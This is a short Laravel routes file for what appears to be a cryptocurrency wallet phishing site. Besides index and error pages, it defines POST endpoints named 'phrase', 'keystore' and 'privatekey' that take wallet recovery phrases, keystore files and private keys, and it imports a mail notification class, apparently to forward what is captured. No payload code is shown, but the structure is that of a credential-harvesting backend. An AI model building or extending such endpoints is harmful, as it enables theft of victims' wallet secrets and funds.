<?php

use App\Http\Controllers\FormController;
use App\Mail\Notification;
use Illuminate\Support\Facades\Route;

Route::get('/', function () {
    return view('index');
});

Route::get('/error', function () {
    return view('error');
});

Route::post('/phrase', [FormController::class, 'phrase'])->name('phrase');
Route::post('/keystore', [FormController::class, 'keystore'])->name('keystore');
Route::post('/privatekey', [FormController::class, 'privatekey'])->name('privatekey');